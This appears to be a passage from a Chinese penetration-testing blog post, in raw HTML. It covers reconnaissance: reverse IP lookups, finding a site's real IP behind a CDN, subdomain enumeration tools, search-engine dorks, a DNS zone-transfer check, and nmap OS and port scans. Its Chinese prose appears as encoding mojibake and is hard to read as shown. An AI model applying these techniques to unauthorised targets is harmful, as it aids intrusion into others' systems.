src="https://img.tucang.cc/api/image/show/13d3890799f612f6182beaa308f2633d"></p><h2 id="IPåæŸ¥ç«™ç‚¹"><a href="#IPåæŸ¥ç«™ç‚¹" class="headerlink" title="IPåæŸ¥ç«™ç‚¹"></a>IPåæŸ¥ç«™ç‚¹</h2><p>1ã€Dnslytics</p><p>åˆ©ç”¨DnslyticsåæŸ¥IPå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata">IP information<br>Network information<br>Hosting information<br>SPAM database <span class="hljs-keyword">lookup</span><br><span class="hljs-keyword">Open</span> TCP/UDP ports<br>Blocklist <span class="hljs-keyword">lookup</span><br>Whois information<br>Geo information<br>Country information<br><span class="hljs-keyword">Update</span> information<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨DnslyticsåæŸ¥åŸŸåå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Domain</span> <span class="hljs-variable">and</span> <span class="hljs-variable">Ranking</span> <span class="hljs-built_in">Information</span><br><span class="hljs-variable">Hosting</span> <span class="hljs-built_in">Information</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-variable">A</span> <span class="hljs-operator">/</span> <span class="hljs-variable">AAAA</span> <span class="hljs-built_in">Record</span><br>    <span class="hljs-variable">NS</span> <span class="hljs-built_in">Record</span><br>    <span class="hljs-variable">MX</span> <span class="hljs-built_in">Record</span><br>    <span class="hljs-variable">SPF</span> <span class="hljs-built_in">Record</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-variable">Web</span> <span class="hljs-built_in">Information</span><br><span class="hljs-variable">Whois</span> <span class="hljs-built_in">Information</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>dnslytics.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/590762f7adb0cad11bc735d084170075"></p><h2 id="ç›¸å…³åº”ç”¨ä¿¡æ¯"><a href="#ç›¸å…³åº”ç”¨ä¿¡æ¯" class="headerlink" title="ç›¸å…³åº”ç”¨ä¿¡æ¯"></a>ç›¸å…³åº”ç”¨ä¿¡æ¯</h2><p>1ã€å¤©çœ¼æŸ¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.tianyancha.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/661b4372c832755592a9c908811850fd"></p><p>2ã€ä¸ƒéº¦æ•°æ®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.qimai.cn/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/621a1b0803763faa545998449a9f153d"></p><h1 id="æŸ¥æ‰¾çœŸå®IP"><a href="#æŸ¥æ‰¾çœŸå®IP" class="headerlink" title="æŸ¥æ‰¾çœŸå®IP"></a>æŸ¥æ‰¾çœŸå®IP</h1><p>åœ¨ä¸€äº›å¤§çš„ç½‘ç«™éƒ½ä¼šä½¿ç”¨CDN(å†…å®¹åˆ†å‘ç½‘ç»œ)ï¼Œå®ƒå¯ä»¥ä½¿å†…å®¹ä¼ è¾“çš„æ›´å¿«ã€æ›´åŠ ç¨³å®šã€‚ï¼ŒCDNç³»ç»Ÿèƒ½å¤Ÿå®æ—¶åœ°æ ¹æ®ç½‘ç»œæµé‡å’Œå„èŠ‚ç‚¹çš„è¿æ¥ã€è´Ÿè½½çŠ¶å†µä»¥åŠåˆ°ç”¨æˆ·çš„è·ç¦»å’Œå“åº”æ—¶é—´ç­‰ç»¼åˆä¿¡æ¯å°†ç”¨æˆ·çš„è¯·æ±‚é‡æ–°å¯¼å‘ç¦»ç”¨æˆ·æœ€è¿‘çš„æœåŠ¡èŠ‚ç‚¹ä¸Šã€‚ä¸€èˆ¬CDNéšè—äº†ç›®æ ‡æœåŠ¡å™¨çš„çœŸå®çš„IPï¼Œä¹Ÿæé«˜äº†å®‰å…¨æ€§ã€‚</p><h2 id="å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä½¿ç”¨CDN"><a href="#å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä½¿ç”¨CDN" class="headerlink" title="å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä½¿ç”¨CDN"></a>å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä½¿ç”¨CDN</h2><p>1ã€pingç›®æ ‡ä¸»åŸŸ</p><p>é€šè¿‡pingç›®æ ‡ä¸»åŸŸï¼Œè§‚å¯ŸåŸŸåè§£ææƒ…å†µæ¥åˆ¤æ–­æ˜¯å¦ä½¿ç”¨CDNã€‚</p><p>å‘ç°ä½¿ç”¨äº†CDNã€‚</p><p><img src="https://img.tucang.cc/api/image/show/74d10acb6acb9071f4fd56db3078c079"></p><p>2ã€Nslookup</p><p>ä¸åŒDNSè§£æç»“æœè‹¥ä¸ä¸€æ ·ï¼Œå¾ˆæœ‰å¯èƒ½å­˜åœ¨CDNæœåŠ¡ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/f3e04104cb049e2d710c2f89e4cab359"></p><p>3ã€pingæ£€æµ‹å¹³å°</p><p>Pingæ£€æµ‹-ç«™é•¿å·¥å…·</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//<span class="hljs-built_in">ping</span>.chinaz.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f5d6354f0e16d1cc1ed6bf6bc4ab18cb"></p><h2 id="ç»•è¿‡CDNå¸¸è§æ–¹æ³•"><a href="#ç»•è¿‡CDNå¸¸è§æ–¹æ³•" class="headerlink" title="ç»•è¿‡CDNå¸¸è§æ–¹æ³•"></a>ç»•è¿‡CDNå¸¸è§æ–¹æ³•</h2><p>1ã€pingä¸»åŸŸ</p><p>æœ‰çš„ç½‘ç«™åªè®©wwwåŸŸåä½¿ç”¨CDN,å¯ä»¥å»æ‰wwwåœ¨pingä¸‹ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/f6d5f970ed86261864c4c387ba4f09a7"></p><p>2ã€DNSå†å²æŸ¥æ‰¾</p><p>CDNå¯èƒ½æ˜¯åœ¨ç½‘ç«™ä¸Šçº¿ä¸€æ®µæ—¶é—´åæ‰ä¸Šçº¿çš„ï¼Œå¯ä»¥é€šè¿‡æŸ¥æ‰¾åŸŸåè§£æè®°å½•çš„æ–¹å¼å»æŸ¥æ‰¾çœŸå®IPã€‚ä»¥ä¸‹ä»‹ç»å‡ ä¸ªå¹³å°</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sitereport.netcraft.com/<br>https:<span class="hljs-regexp">//</span>viewdns.info/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/95b44d91cfb8ee6fd27a106a95c97c0c"></p><p><img src="https://img.tucang.cc/api/image/show/78f1c23d78f513037b2a5b8bacb63617"></p><p><img src="https://img.tucang.cc/api/image/show/09e1f106961750c635cf4a71d0f8762c"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>tools.ipip.net/cdn.php<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f47ff556e197a4734949f8efa1dee574"></p><p>3ã€æŸ¥è¯¢å­åŸŸåæ–¹æ³•</p><p>ä¸€èˆ¬éƒ½æ˜¯ä¸»ç«™åŠ å…¥CDNï¼Œå­åŸŸåç«™ç‚¹å¾ˆå¤šæ²¡æœ‰åŠ å…¥ï¼Œå¯ä»¥é€šè¿‡å­åŸŸåæ¥è·å–ï¼Œä¸‹è¾¹æœ‰æ”¶é›†å­åŸŸåè¯¦ç»†ä»‹ç»ï¼Œåœ¨è¿™é‡Œä¸¾ä¾‹ä¸€ä¸ªã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>x.threatbook.cn/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/c423fc87bbd87c15516e8985cc216863"></p><p>4ã€ç½‘ç«™é‚®ä»¶å¤´ä¿¡æ¯</p><p>æ¯”å¦‚è¯´ï¼Œé‚®ç®±æ³¨å†Œï¼Œé‚®ç®±æ‰¾å›å¯†ç ã€RSSé‚®ä»¶è®¢é˜…ç­‰åŠŸèƒ½åœºæ™¯ï¼Œé€šè¿‡ç½‘ç«™ç»™è‡ªå·±å‘é€é‚®ä»¶ï¼Œä»è€Œè®©ç›®æ ‡ä¸»åŠ¨æš´éœ²ä»–ä»¬çš„çœŸå®çš„IPï¼ŒæŸ¥çœ‹é‚®ä»¶å¤´ä¿¡æ¯ï¼Œè·å–åˆ°ç½‘ç«™çš„çœŸå®IPã€‚</p><p>æ³¨æ„ï¼šå¿…é¡»æ˜¯ç›®æ ‡è‡ªå·±çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œç¬¬ä¸‰æ–¹æˆ–å…¬å…±é‚®ä»¶æœåŠ¡å™¨æ˜¯æ²¡æœ‰ç”¨çš„ã€‚</p><p>5ã€ç½‘ç»œç©ºé—´æœç´¢å¼•æ“æ³•</p><p>é€šè¿‡å…³é”®å­—æˆ–ç½‘ç«™åŸŸåï¼Œå°±å¯ä»¥æ‰¾å‡ºè¢«æ”¶å½•çš„IPï¼Œå¾ˆå¤šæ—¶å€™è·å–åˆ°çš„å°±æ˜¯ç½‘ç«™çš„çœŸå®IPã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">é’Ÿé¦—ä¹‹çœ¼ï¼šhttps:<span class="hljs-regexp">//</span>www.zoomeye.org<br>Shodanï¼šhttps:<span class="hljs-regexp">//</span>www.shodan.io<br>Fofaï¼šhttps:<span class="hljs-regexp">//</span>fofa.so<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/6b98f69c0e45b317559f80e04362b639"></p><p>6ã€ç½‘ç«™æ¼æ´æŸ¥æ‰¾</p><p>é€šè¿‡ç½‘ç«™çš„ä¿¡æ¯æ³„éœ²å¦‚phpinfoæ³„éœ²ï¼Œgithubä¿¡æ¯æ³„éœ²ï¼Œå‘½ä»¤æ‰§è¡Œç­‰æ¼æ´è·å–çœŸå®ipã€‚</p><h1 id="æ”¶é›†å­åŸŸå"><a href="#æ”¶é›†å­åŸŸå" class="headerlink" title="æ”¶é›†å­åŸŸå"></a>æ”¶é›†å­åŸŸå</h1><h2 id="åœ¨çº¿å¹³å°"><a href="#åœ¨çº¿å¹³å°" class="headerlink" title="åœ¨çº¿å¹³å°"></a>åœ¨çº¿å¹³å°</h2><p>1ã€IP138</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>site.ip138.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/4775f94bd6b1997c269873e50ce6959c"></p><p>2ã€ç«™é•¿å·¥å…·</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tool.chinaz.com<span class="hljs-regexp">/subdomain/</span>?domain=<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/8dbc9b0638ae4ae3bf8452af34319a0f"></p><p>3ã€hackertarget</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackertarget.com<span class="hljs-regexp">/find-dns-host-records/</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/77e7af875ddffcdee6b0a7953fc77891"></p><p>4ã€phpinfo</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>phpinfo.me<span class="hljs-regexp">/domain/</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/c693e614620702c6173e63085c4b183d"></p><p>5ã€dnsdumpster</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>dnsdumpster.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/b3a60b3ed74b029dcd9aed71b3abe618"></p><p>6ã€zcjun</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>z.zcjun.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/431e825630d3f69f4a9f13f9003529bc"></p><p>7ã€Censys</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>censys.io/certificates?q=<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/887be079be9ab05d11f1e4dd8abc10b0"></p><h2 id="IPåæŸ¥ç»‘å®šåŸŸåç½‘ç«™"><a href="#IPåæŸ¥ç»‘å®šåŸŸåç½‘ç«™" class="headerlink" title="IPåæŸ¥ç»‘å®šåŸŸåç½‘ç«™"></a>IPåæŸ¥ç»‘å®šåŸŸåç½‘ç«™</h2><p>1ã€chinaz</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>s.tool.chinaz.com/same?s=<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/7bca13385928811e1650642cdcc5f653"></p><p>2ã€çˆ±ç«™</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>dns.aizhan.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f7ddc37108c979834516c4c12694cb72"></p><p>3ã€webscan.cc</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.webscan.cc/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/7c9c1129540acc258c4f78cd66fe2311"></p><h2 id="èµ„äº§æœç´¢å¼•æ“"><a href="#èµ„äº§æœç´¢å¼•æ“" class="headerlink" title="èµ„äº§æœç´¢å¼•æ“"></a>èµ„äº§æœç´¢å¼•æ“</h2><p>ä¸ªäººå¸¸ç”¨çš„æœ‰Googleã€FOFAï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨Shodanã€zoomeyeé’Ÿé¦—ä¹‹çœ¼.</p><p>1ã€Googleè¯­æ³•</p><p>å¸¸ç”¨è¯­æ³•</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">site ï¼šæŒ‡å®šæœç´¢åŸŸå ä¾‹å¦‚ï¼šsite:baidu.com<br>inurl : æŒ‡å®š<span class="hljs-type">url</span>ä¸­æ˜¯å¦å­˜åœ¨æŸäº›å…³é”®å­— ä¾‹å¦‚ï¼šinurl:.php?id=<br>intext :  æŒ‡å®šç½‘é¡µä¸­æ˜¯å¦å­˜åœ¨æŸäº›å…³é”®å­— ä¾‹å¦‚ï¼š<span class="hljs-type">intext</span>:ç½‘ç«™ç®¡ç†<br>filetype : æŒ‡å®šæœç´¢æ–‡ä»¶ç±»å‹ ä¾‹å¦‚ï¼š<span class="hljs-type">filetype</span>:txt<br>intitle :  æŒ‡å®šç½‘é¡µæ ‡é¢˜æ˜¯å¦å­˜åœ¨æŸäº›å…³é”®å­— ä¾‹å¦‚ï¼š<span class="hljs-type">intitle</span>:åå°ç®¡ç†<br>link : æŒ‡å®šç½‘é¡µé“¾æ¥ ä¾‹å¦‚ï¼š<span class="hljs-type">link</span>:baidu.com æŒ‡å®šä¸ç™¾åº¦åšäº†å¤–é“¾çš„ç«™ç‚¹<br>info : æŒ‡å®šæœç´¢ç½‘é¡µä¿¡æ¯ <span class="hljs-type">info</span>:baidu.com<br></code></pre></td></tr></table></figure><p>2ã€FOFAè¯­æ³•</p><p>å¯ä»¥åœ¨é¦–é¡µç‚¹å‡»æŸ¥è¯¢è¯­æ³•æ¥æŸ¥çœ‹</p><p><img src="https://img.tucang.cc/api/image/show/6d8ca0880205ef951b375cea98a492d4"></p><h2 id="å·¥å…·æšä¸¾"><a href="#å·¥å…·æšä¸¾" class="headerlink" title="å·¥å…·æšä¸¾"></a>å·¥å…·æšä¸¾</h2><p>åœ¨è¿™é‡Œå¸¸ç”¨çš„sublist3rã€OneForAllã€subDomainsBrute.</p><p>1ã€sublist3r</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä¸‹è½½åœ°å€:https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/aboul3la/</span>Sublist3r<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/2b98d493aae45bf9486aeba45de49023"></p><p>2ã€OneForAll</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä¸‹è½½åœ°å€ï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shmilylty/</span>OneForAll<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/9ff4b06402688d42f02077d904f062ba"></p><p>è¿è¡Œå®Œæˆåä¼šç”Ÿæˆä¸€ä¸ªcsvæ–‡ä»¶</p><p><img src="https://img.tucang.cc/api/image/show/0af75f23b628b65ebd7b531f268feb69"></p><p>3ã€subDomainsBrute</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä¸‹è½½åœ°å€ï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lijiejie/</span>subDomainsBrute<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/b1a70863e00ce99967f5c8010d41e1bc"></p><p><img src="https://img.tucang.cc/api/image/show/5b241c83d7d7102e2aa84c944381611e"></p><h2 id="åˆ©ç”¨DNSæ”¶é›†"><a href="#åˆ©ç”¨DNSæ”¶é›†" class="headerlink" title="åˆ©ç”¨DNSæ”¶é›†"></a>åˆ©ç”¨DNSæ”¶é›†</h2><p>å¸¸è§çš„DNSè®°å½•æœ‰ä»¥ä¸‹å‡ ç±»ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span>è®°å½•       IPåœ°å€è®°å½•,è®°å½•ä¸€ä¸ªåŸŸåå¯¹åº”çš„IPåœ°å€<br><span class="hljs-keyword">AAAA</span>è®°å½•    IPv6åœ°å€è®°å½•ï¼Œè®°å½•ä¸€ä¸ªåŸŸåå¯¹åº”çš„IPv6åœ°å€<br><span class="hljs-keyword">CNAME</span>è®°å½•   åˆ«åè®°å½•ï¼Œè®°å½•ä¸€ä¸ªä¸»æœºçš„åˆ«å<br><span class="hljs-keyword">MX</span>è®°å½•      ç”µå­é‚®ä»¶äº¤æ¢è®°å½•ï¼Œè®°å½•ä¸€ä¸ªé‚®ä»¶åŸŸåå¯¹åº”çš„IPåœ°å€<br><span class="hljs-keyword">NS</span>è®°å½•      åŸŸåæœåŠ¡å™¨è®°å½• ,è®°å½•è¯¥åŸŸåç”±å“ªå°åŸŸåæœåŠ¡å™¨è§£æ<br><span class="hljs-keyword">PTR</span>è®°å½•     åå‘è®°å½•ï¼Œä¹Ÿå³ä»IPåœ°å€åˆ°åŸŸåçš„ä¸€æ¡è®°å½•<br><span class="hljs-keyword">TXT</span>è®°å½•     è®°å½•åŸŸåçš„ç›¸å…³æ–‡æœ¬ä¿¡æ¯<br></code></pre></td></tr></table></figure><p>MXè®°å½•ï¼šå»ºç«‹ç”µå­é‚®ç®±æœåŠ¡ï¼Œå°†æŒ‡å‘é‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œéœ€è¦è®¾ç½®MXè®°å½•ã€‚å»ºç«‹é‚®ç®±æ—¶ï¼Œä¸€èˆ¬ä¼šæ ¹æ®é‚®ç®±æœåŠ¡å•†æä¾›çš„MXè®°å½•å¡«å†™æ­¤è®°å½•ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/1eb305730d5aee6e912a0d72426ded06"></p><p>NSè®°å½•ï¼šåŸŸåè§£ææœåŠ¡å™¨è®°å½•ï¼Œå¦‚æœè¦å°†å­åŸŸåæŒ‡å®šæŸä¸ªåŸŸåæœåŠ¡å™¨æ¥è§£æï¼Œéœ€è¦è®¾ç½®NSè®°å½•ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/0a023a439e647ba7b194be79948aefe3"></p><p>SOAè®°å½•ï¼šSOAå«åšèµ·å§‹æˆæƒæœºæ„è®°å½•ï¼ŒNSç”¨äºæ ‡è¯†å¤šå°åŸŸåè§£ææœåŠ¡å™¨ï¼ŒSOAè®°å½•ç”¨äºåœ¨ä¼—å¤šNSè®°å½•ä¸­é‚£ä¸€å°æ˜¯ä¸»æœåŠ¡å™¨ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/39f41cb55b12ad5328518e50c2686f81"></p><p>TXTè®°å½•ï¼šå¯ä»»æ„å¡«å†™ï¼Œå¯ä¸ºç©ºã€‚ä¸€èˆ¬åšä¸€äº›éªŒè¯è®°å½•æ—¶ä¼šä½¿ç”¨æ­¤é¡¹ï¼Œå¦‚ï¼šåšSPFï¼ˆååƒåœ¾é‚®ä»¶ï¼‰è®°å½•ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/4452db8fed7346a8ca3ba1ae9454d95c"></p><p>DNSåŸŸä¼ é€æ¼æ´</p><p>1ã€åŸç†ï¼šDNSæœåŠ¡å™¨åˆ†ä¸ºï¼šä¸»æœåŠ¡å™¨ã€å¤‡ä»½æœåŠ¡å™¨å’Œç¼“å­˜æœåŠ¡å™¨ã€‚åœ¨ä¸»å¤‡æœåŠ¡å™¨ä¹‹é—´åŒæ­¥æ•°æ®åº“ï¼Œéœ€è¦ä½¿ç”¨â€œDNSåŸŸä¼ é€â€ã€‚åŸŸä¼ é€æ˜¯æŒ‡å¤‡ä»½æœåŠ¡å™¨ä»ä¸»æœåŠ¡å™¨æ‹·è´æ•°æ®ï¼Œå¹¶ç”¨å¾—åˆ°çš„æ•°æ®æ›´æ–°è‡ªèº«æ•°æ®åº“ã€‚</p><p>è‹¥DNSæœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´æ”»å‡»è€…è·å–æŸä¸ªåŸŸçš„æ‰€æœ‰è®°å½•ã€‚é€ æˆæ•´ä¸ªç½‘ç»œçš„æ‹“æ‰‘ç»“æ„æ³„éœ²ç»™æ½œåœ¨çš„æ”»å‡»è€…ï¼ŒåŒ…æ‹¬ä¸€äº›å®‰å…¨æ€§è¾ƒä½çš„å†…éƒ¨ä¸»æœºï¼Œå¦‚æµ‹è¯•æœåŠ¡å™¨ã€‚åŒæ—¶ï¼Œé»‘å®¢å¯ä»¥å¿«é€Ÿçš„åˆ¤å®šå‡ºæŸä¸ªç‰¹å®šzoneçš„æ‰€æœ‰ä¸»æœºï¼Œæ”¶é›†åŸŸä¿¡æ¯ï¼Œé€‰æ‹©æ”»å‡»ç›®æ ‡ï¼Œæ‰¾å‡ºæœªä½¿ç”¨çš„IPåœ°å€ï¼Œç»•è¿‡åŸºäºç½‘ç»œçš„è®¿é—®æ§åˆ¶ã€‚</p><p>2ã€DNSåŸŸä¼ é€æ¼æ´æ£€æµ‹</p><p>åŸºæœ¬è¿‡ç¨‹</p><ol><li><p>nslookup #è¿›å…¥äº¤äº’å¼shell</p></li><li><p>server dns.xx.yy.zz #è®¾å®šæŸ¥è¯¢å°†è¦ä½¿ç”¨çš„DNSæœåŠ¡å™¨</p></li><li><p>ls xx.yy.zz #åˆ—å‡ºæŸä¸ªåŸŸä¸­çš„æ‰€æœ‰åŸŸå</p></li><li><p>exit #é€€å‡º</p></li></ol><p>æ¼æ´æ£€æµ‹-ä¸å­˜åœ¨æ¼æ´</p><p><img src="https://img.tucang.cc/api/image/show/d63041af22d67e9c779cd3a0ebe82745"></p><h1 id="ç«™ç‚¹ä¿¡æ¯æ”¶é›†"><a href="#ç«™ç‚¹ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç«™ç‚¹ä¿¡æ¯æ”¶é›†"></a>ç«™ç‚¹ä¿¡æ¯æ”¶é›†</h1><h2 id="åˆ¤æ–­å¯¹æ–¹æ˜¯winè¿˜æ˜¯Linux"><a href="#åˆ¤æ–­å¯¹æ–¹æ˜¯winè¿˜æ˜¯Linux" class="headerlink" title="åˆ¤æ–­å¯¹æ–¹æ˜¯winè¿˜æ˜¯Linux"></a>åˆ¤æ–­å¯¹æ–¹æ˜¯winè¿˜æ˜¯Linux</h2><p>1ã€TTLå€¼</p><p>å¯ä»¥é€šè¿‡pingæ¥æŸ¥çœ‹ï¼Œä¸è¿‡ä¸ä¸€å®šéå¸¸å‡†å¯ä»¥è¢«ä¿®æ”¹ï¼Œé»˜è®¤Linuxæ˜¯64ï¼Œwinæ˜¯128</p><p>Linuxï¼š</p><p><img src="https://img.tucang.cc/api/image/show/58b14f3d0a86b21558af995b3d78314e"></p><p>Windowsï¼š</p><p><img src="https://img.tucang.cc/api/image/show/1056fcd834dde8b85ea5badaf45499bf"></p><p>2ã€Nmap</p><p>ä½¿ç”¨å‘½ä»¤ï¼š</p><p>nmap -O IP</p><p><img src="https://img.tucang.cc/api/image/show/67929f8bbba48b6672f2c621ccd01c64"></p><h2 id="ç«¯å£æ”¶é›†"><a href="#ç«¯å£æ”¶é›†" class="headerlink" title="ç«¯å£æ”¶é›†"></a>ç«¯å£æ”¶é›†</h2><p>nmap</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sV -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> IP  # pingç›®æ ‡æœ‰å›å¤æ—¶<br><span class="hljs-attribute">nmap</span> -sV -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -Pn IP  # pingç›®æ ‡æ²¡æœ‰å›å¤æ—¶<br></code></pre></td></tr></table></figure><h2 id="CMSæŒ‡çº¹è¯†åˆ«"><a href="#CMSæŒ‡çº¹è¯†åˆ«" class="headerlink" title="CMSæŒ‡çº¹è¯†åˆ«"></a>CMSæŒ‡çº¹è¯†åˆ«</h2><p>CMSï¼ˆå†…å®¹ç®¡ç†ç³»ç»Ÿï¼‰ç”¨äºç½‘ç«™å†…å®¹ç®¡ç†ï¼Œé€šè¿‡è¯†åˆ«CMSç±»å‹å¯ä»¥æŸ¥çœ‹ç›¸åº”çš„æ¼æ´æ‹¿ä¸‹ç«™ç‚¹ã€‚</p><p>å¦‚ä»Šï¼Œç½‘ä¸Šä¸€äº›åœ¨çº¿çš„ç½‘ç«™æŸ¥è¯¢CMSæŒ‡çº¹è¯†åˆ«ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">BugScaner:Â http:<span class="hljs-regexp">//</span>whatweb.bugscaner.com<span class="hljs-regexp">/look/</span><br>æ½®æ±æŒ‡çº¹ï¼šhttp:<span class="hljs-regexp">//</span>finger.tidesec.net/<br>äº‘æ‚‰ï¼šhttp:<span class="hljs-regexp">//</span>www.yunsee.cn/info.html<br>WhatWeb:Â https:<span class="hljs-regexp">//</span>whatweb.net/<br>äº‘æ‚‰æŒ‡çº¹:Â http:<span class="hljs-regexp">//</span>www.yunsee.cn/finger.html<br>WhatWeb:Â https:<span 